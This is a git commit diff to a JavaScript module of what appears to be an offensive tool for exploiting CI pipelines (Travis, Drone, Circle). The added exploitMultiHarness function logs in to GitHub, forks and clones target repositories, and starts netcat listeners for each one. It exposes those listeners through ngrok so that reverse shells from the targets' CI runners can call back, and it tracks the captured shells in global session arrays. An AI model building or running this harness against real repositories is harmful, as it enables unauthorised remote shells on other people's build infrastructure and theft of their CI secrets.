52690653a9b84e3a4af4963591b1885ca3c0f4af
pickle0x90 <spaceB0xpentest@gmail.com>
2017-08-13 14:09:22 -0500

    travis netcat exploit rewrite

--- src/lib/exp.js
+++ src/lib/exp.js
@@ -1,11 +1,18 @@
-const log = console.log;
-      fs = require('fs'),
-      clear = require('clear'),
-      chalk = require('chalk'),
-      path = require('path'),
-      exdir = __dirname + '/../exploits',
-      expath = path.resolve(exdir),
-      files = require(__dirname + '/files'),
+const log = console.log,
+  fs = require('fs'),
+  clear = require('clear'),
+  chalk = require('chalk'),
+  red = chalk.red,
+  green = chalk.green,
+  path = require('path'),
+  github = require(__dirname + '/gh'),
+  exdir = __dirname + '/../exploits',
+  expath = path.resolve(exdir),
+  files = require(__dirname + '/files'),
+  targets = require(__dirname + '/targets'),
+  repos = require(__dirname + '/repos'),
+  server = require(__dirname + '/server'),
+  ng = require(__dirname + '/ng')
 
 module.exports = {
 
@@ -14,11 +21,11 @@ module.exports = {
     clear();
     log(chalk.cyan("------------", "\n Exploits ", "\n------------"));
     const exlist = files.walkSync(exdir),
-          tlist = [];
+      tlist = [];
     exlist.forEach((item) => {
       if (item.includes("exploit.js")) {
-          tlist.push(item);
-          log(item.replace(`${expath}/`, '').replace('/exploit.js',''));
+        tlist.push(item);
+        log(item.replace(`${expath}/`, '').replace('/exploit.js', ''));
       }
     });
     log();
@@ -27,8 +34,124 @@ module.exports = {
 
   //Checks if exploits exist
   exploitExists: (exploit) => {
-      return fs.existsSync(`${exdir}/${exploit}/exploit.js`);
+    return fs.existsSync(`${exdir}/${exploit}/exploit.js`);
   },
 
-  
+  /* -------------------------------
+    Exploit Writing Functions
+    -------------------------------*/
+
+  /*
+  exploitMultiHarness
+  -------------------
+  This will be the "mountin harness" for writing exploits.
+  When writing exploits here is where to start.
+
+  Parameters:
+    auth_type - just 'github' for now, but will soon be others
+    fork_type - 'forked' is the only option for now. Any others will result in trying to commit right to the branch without forking it
+    target_type - 'travis', 'drone', and 'circle' are currently accepted
+    exploit_name - name of exploit. Generate by sending in results of module.exports.name() in exploit file
+
+  Returns: null, raw_targets, ci_targets,hostname_arr, port_arr, server_arr, url_arr
+    err - errors
+    token - Auth token
+    authed_user - Authed user
+    raw_targets - Array of targets w/ original owner names
+    ci_targets - Array of forked target repos, only consisting of valid exploit types (travis, drone, etc.)
+    hostname_arr - Array of public hostnames from NGROK for callbacks
+    port_arr - Array of NGROK public ports
+    server_arr - Array of server objects from NGROK (not used that much)
+    url_arr - Array of full NGROK URLS (also not used much)
+  */
+  exploitMultiHarness: (auth_type, fork_type, target_type, exploit_name, cb) => {
+    let token = "";
+    let authed_user = "";
+
+    // Switch to decide auth type
+    switch (auth_type) {
+      case 'github':
+        github.githubAuth((err, tok, user) => {
+          // Check for auth errors
+          if (err) {
+            switch (err.code) {
+              case 401:
+                log(chalk.red('Couldn\'t log you in. Please try again.'));
+                break;
+              case 422:
+                log(chalk.red('You already have an access token.'));
+                break;
+            }
+            return cb(err);
+          }
+          token = tok;
+          authed_user = user;
+        })
+        break;
+      default:
+        log(red("Uknown authtype in exploitMultiHarness"));
+        cb();
+        break;
+    }
+
+    // Check if there are targets to run against
+    if (targets.getNumTargets() === 0) {
+      log(red("There are no targets to exploit. Exiting run."));
+      return cb("ERROR");
+    }
+
+    // If token exists, continue with exploit
+    if (token) {
+      const type = fork_type;
+
+      // Ngrok Auth
+      ng.ngrokAuth((err, ngtoken) => {
+        // check for ngrok err
+        if (err) {
+          log(chalk.red(`ERROR with ngrok authentication. ${err}`));
+          return cb("ERROR");
+        }
+        let ng_token = ngtoken;
+
+        // Fork all repos in targets
+        repos.forkAll(token, authed_user, () => {
+
+          // Clone all repos that have been forked
+          repos.cloneAllRepos(type, authed_user, () => {
+
+            // CREATE TRAVIS SPECIFIC LIST HERE TO USE FROM HERE ON OUT
+            targets.getForkedTargetType(target_type, authed_user, (raw_targets, ci_targets) => {
+
+              // Start a netcat listener for each cloned repo
+              server.startNetcatAll(ci_targets, (nc_arr, ports_arr, dupIn_arr, dupOut_arr) => {
+
+                // Push global lists for new shells
+                global.shells_arr.push.apply(global.shells_arr, nc_arr);
+                global.duplexInput_arr.push.apply(global.duplexInput_arr, dupIn_arr);
+                global.duplexOutput_arr.push.apply(global.duplexOutput_arr, dupOut_arr);
+                global.session_name_arr.push.apply(global.session_name_arr, raw_targets);
+                for (let l = 0; l < global.nc_arr; l++) {
+                  global.session_exploit_arr.push(exploit_name);
+                }
+
+                // Start an Ngrok instances for listening
+                log(green("Starting ngrok Services..."));
+                server.startNgrokAll(ports_arr, ng_token, (err, hostname_arr, port_arr, server_arr, url_arr) => {
+                  if (err) {
+                    log(err);
+                    return cb(err);
+                  } else {
+                    return cb(null, token, authed_user, raw_targets, ci_targets, hostname_arr, port_arr, server_arr, url_arr)
+                  }
+                })
+
+              })
+            })
+          })
+        })
+      })
+    }
+  }
+
+
 }
